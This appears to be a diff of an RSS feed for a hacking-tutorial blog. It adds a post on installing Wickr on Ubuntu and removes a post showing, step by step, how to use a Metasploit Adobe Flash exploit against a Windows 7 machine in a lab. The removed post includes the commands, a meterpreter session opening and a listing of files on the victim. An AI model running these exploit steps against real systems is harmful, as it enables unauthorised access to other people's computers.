@@ -2,9 +2,41 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>m3t4lk3y</title><link>https://metalkey.github.io/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Sun, 09 Oct 2016 23:38:12 +1100</lastBuildDate>
-<pubDate>Sun, 09 Oct 2016 23:38:12 +1100</pubDate>
+<lastBuildDate>Sat, 22 Oct 2016 18:22:18 +1100</lastBuildDate>
+<pubDate>Sat, 22 Oct 2016 18:22:18 +1100</pubDate>
 <atom:link href="https://metalkey.github.io/feed.rss" rel="self" type="application/rss+xml" />
+<item><title>
+Installing Wickr on Ubuntu 16.04
+</title><description><![CDATA[
+
+<h2>Download Wickr and Dependencies</h2>
+<code>
+<div class="code">
+	user@ubuntu~$ <com>wget https://dls.wickr.com/Downloads/wickr-me_2.6.0_amd64.deb<br></com>
+	user@ubuntu~$ <com>wget http://security.ubuntu.com/ubuntu/pool/universe/liba/libav/libavutil52_9.18-0ubuntu0.14.04.1_amd64.deb<br></com>
+	user@ubuntu~$ <com>wget http://mirrors.kernel.org/ubuntu/pool/main/i/icu/libicu52_52.1-8ubuntu0.2_amd64.deb<br></com>
+	user@ubuntu~$ <com>wget http://mirrors.kernel.org/ubuntu/pool/universe/x/x264/libx264-142_0.142.2389+git956c8d8-2_amd64.deb<br></com>
+</div>
+</code>
+
+<h2>Install Dependencies and Wickr</h2>
+<code>
+<div class="code">
+	user@ubuntu~$ <com>sudo dpkg -i libavutil52_9.18-0ubuntu0.14.04.1_amd64.deb<br></com>
+	user@ubuntu~$ <com>sudo dpkg -i libicu52_52.1-8ubuntu0.2_amd64.deb<br></com>
+	user@ubuntu~$ <com>sudo dpkg -i libx264-142_0.142.2389+git956c8d8-2_amd64.deb<br></com>
+	user@ubuntu~$ <com>sudo dpkg -i wickr-me_2.6.0_amd64.deb<br></com>
+	user@ubuntu~$ <com>wickr-me<br></com>
+</div>
+</code>
+
+<p>Tags: <a href='tag_Privacy.html'>Privacy</a></p>
+
+<!-- text end -->
+]]></description><link>https://metalkey.github.io/installing-wickr-on-ubuntu-1604.html</link>
+<guid>https://metalkey.github.io/./installing-wickr-on-ubuntu-1604.html</guid>
+<dc:creator>metalkey</dc:creator>
+<pubDate>Sat, 22 Oct 2016 18:13:57 +1100</pubDate></item>
 <item><title>
 Port Scanning With Netcat (Up to 1000 ports/second)
 </title><description><![CDATA[
@@ -206,6 +238,8 @@ root@metasploitable:/etc/unreal#
 
 
 
+
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/unrealircd-3281-backdoor-command-execution.html</link>
 <guid>https://metalkey.github.io/./unrealircd-3281-backdoor-command-execution.html</guid>
@@ -359,6 +393,8 @@ root
 
 
 
+
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</link>
 <guid>https://metalkey.github.io/./linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</guid>
@@ -493,6 +529,8 @@ If your system is vulnerable, ensure it is patched immediately by upgrading your
 
 
 
+
+
 <!-- text end -->
 ]]></description><link>https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html</link>
 <guid>https://metalkey.github.io/./shellshock-explained--exploitation-tutorial.html</guid>
@@ -607,6 +645,8 @@ C:\7-ZipPortable>
 <p></code></p>
 
 <p>Tags: <a href='tag_av-evasion.html'>av-evasion</a></p>
+
+
 
 
 
@@ -753,83 +793,4 @@ You now have shell access to the Windows XP SP3 Victim with the same access as t
 <guid>https://metalkey.github.io/./metasploit-browser-autopwn---windows-xp-sp2.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Fri, 01 Jul 2016 15:09:53 +1000</pubDate></item>
-<item><title>
-Metasploit Adobe Flash 18.0.0.203 Exploit – Windows 7 / Windows 8.1
-</title><description><![CDATA[
-<strong>Attacker:</strong> Kali Linux<br>
-<strong>Victim:</strong> Windows 7 Enterprise 32-bit (Adobe Flashplayer 18.0.0.203, Firefox 39)</p>
-
-<h2>Step 1 – Starting the Exploit Server</h2>
-
-<p>Run msfconsole, load adobe-flash-opaque-background-uaf and set all required options.
-<code></p>
-
-<div class="code">
-root@kali:~$ <com>msfconsole</com><br>
-msf > <com>use exploit/multi/browser/adobe_flash_opaque_background_uaf</com><br>
-msf exploit(adobe_flash_opaque_background_uaf) > <com>set SRVPORT 80</com><br>
-msf exploit(adobe_flash_opaque_background_uaf) > <com>set URIPATH /</com><br>
-msf exploit(adobe_flash_opaque_background_uaf) > <com>exploit</com><br>
-[*] Local IP: http://192.168.1.12:80/<br>
-[*] Server started.<br>
-</div>
-
-<p></code></p>
-
-<h2>Step 2 – Exploiting the Victim Machine</h2>
-
-<p>On your Windows test machine (victim), start Firefox and browse to http://192.168.1.12.<br>
-This will trigger the adobe-flash-opaque-background-uaf exploit and launch a meterpreter session.<br>
-<code></p>
-
-<div class="code">
-[*] 192.168.1.11 adobe_flash_opaque_background_uaf - Sending SWF...<br>
-[*] Sending stage (885806 bytes) to 192.168.1.11<br>
-[*] Meterpreter session 1 opened (192.168.1.12:4444 -> 192.168.1.11:49297) at 2015-08-01 04:39:34 -0400<br>
-msf exploit(adobe_flash_opaque_background_uaf) > <com>sessions -i 1</com><br>
-[*] Starting interaction with 1...<br>
-<br>
-meterpreter > <com>getuid</com><br>
-Server username: IE8Win7\IEUser<br>
-meterpreter > <com>ls</com><br>
-Listing: C:\<br>
-============<br>
-<br>
-Mode Size Type Last modified Name<br>
----- ---- ---- ------------- ----<br>
-40777/rwxrwxrwx 0 dir 2013-10-23 12:22:56 -0400 $Recycle.Bin<br>
-40777/rwxrwxrwx 0 dir 2009-07-14 00:53:55 -0400 Documents and Settings<br>
-40777/rwxrwxrwx 0 dir 2009-07-13 22:37:05 -0400 PerfLogs<br>
-40555/r-xr-xr-x 0 dir 2015-08-01 03:32:42 -0400 Program Files<br>
-40777/rwxrwxrwx 0 dir 2015-08-01 03:32:42 -0400 ProgramData<br>
-40777/rwxrwxrwx 0 dir 2013-10-23 12:22:42 -0400 Recovery<br>
-40777/rwxrwxrwx 0 dir 2014-11-26 14:57:05 -0500 System Volume Information<br>
-40555/r-xr-xr-x 0 dir 2013-10-23 12:22:47 -0400 Users<br>
-40777/rwxrwxrwx 0 dir 2013-10-23 17:52:20 -0400 Wallpaper<br>
-40777/rwxrwxrwx 0 dir 2015-08-01 03:20:08 -0400 Windows<br>
-100777/rwxrwxrwx 24 fil 2009-06-10 17:42:20 -0400 autoexec.bat<br>
-100666/rw-rw-rw- 10 fil 2009-06-10 17:42:20 -0400 config.sys<br>
-100666/rw-rw-rw- 1073741824 fil 2015-08-01 04:01:24 -0400 pagefile.sys<br>
-</div>
-
-<p></code></p>
-
-<h2>Solution</h2>
-
-<p>Uninstall flashplayer.</p>
-
-<p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
-
-
-
-
-
-
-
-
-<!-- text end -->
-]]></description><link>https://metalkey.github.io/metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</link>
-<guid>https://metalkey.github.io/./metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</guid>
-<dc:creator>metalkey</dc:creator>
-<pubDate>Fri, 01 Jul 2016 15:06:44 +1000</pubDate></item>
 </channel></rss>
